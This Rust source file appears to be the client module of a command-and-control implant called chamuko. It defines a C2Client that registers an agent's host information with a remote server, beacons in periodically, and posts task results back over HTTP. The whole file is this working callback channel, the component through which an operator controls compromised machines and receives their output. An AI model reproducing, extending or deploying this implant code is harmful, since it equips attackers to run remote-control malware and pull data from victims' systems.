use chamuko_protocol::{
    BeaconRequest, BeaconResponse, RegisterRequest, RegisterResponse, ResultsRequest, TaskResult,
};

#[derive(Debug)]
pub enum C2Error {
    Http(String),
    Parse(String),
}

impl std::fmt::Display for C2Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Http(e) => write!(f, "http error: {e}"),
            Self::Parse(e) => write!(f, "parse error: {e}"),
        }
    }
}

impl std::error::Error for C2Error {}

pub struct C2Client {
    base: String,
    agent: ureq::Agent,
}

impl C2Client {
    pub fn new(base: String) -> Self {
        let agent = ureq::AgentBuilder::new()
            .timeout_connect(std::time::Duration::from_secs(10))
            .timeout(std::time::Duration::from_secs(30))
            .build();
        Self { base, agent }
    }

    fn url(&self, path: &str) -> String {
        let base = self.base.trim_end_matches('/');
        format!("{base}{path}")
    }

    pub fn register(
        &self,
        info: &chamuko_protocol::AgentInfo,
    ) -> Result<RegisterResponse, C2Error> {
        let body = RegisterRequest {
            agent: info.clone(),
        };
        let resp = self
            .agent
            .post(&self.url("/register"))
            .send_json(serde_json::to_value(&body).map_err(|e| C2Error::Parse(e.to_string()))?)
            .map_err(|e| C2Error::Http(e.to_string()))?;
        let parsed: RegisterResponse = resp
            .into_json()
            .map_err(|e| C2Error::Parse(e.to_string()))?;
        Ok(parsed)
    }

    pub fn beacon(&self, id: &str) -> Result<BeaconResponse, C2Error> {
        let body = BeaconRequest {
            id: id.to_string(),
            timestamp: chamuko_protocol::now_secs(),
        };
        let resp = self
            .agent
            .post(&self.url("/beacon"))
            .send_json(serde_json::to_value(&body).map_err(|e| C2Error::Parse(e.to_string()))?)
            .map_err(|e| C2Error::Http(e.to_string()))?;
        let parsed: BeaconResponse = resp
            .into_json()
            .map_err(|e| C2Error::Parse(e.to_string()))?;
        Ok(parsed)
    }

    pub fn post_results(&self, id: &str, results: Vec<TaskResult>) -> Result<(), C2Error> {
        if results.is_empty() {
            return Ok(());
        }
        let body = ResultsRequest {
            id: id.to_string(),
            results,
        };
        self.agent
            .post(&self.url("/results"))
            .send_json(serde_json::to_value(&body).map_err(|e| C2Error::Parse(e.to_string()))?)
            .map_err(|e| C2Error::Http(e.to_string()))?;
        Ok(())
    }
}
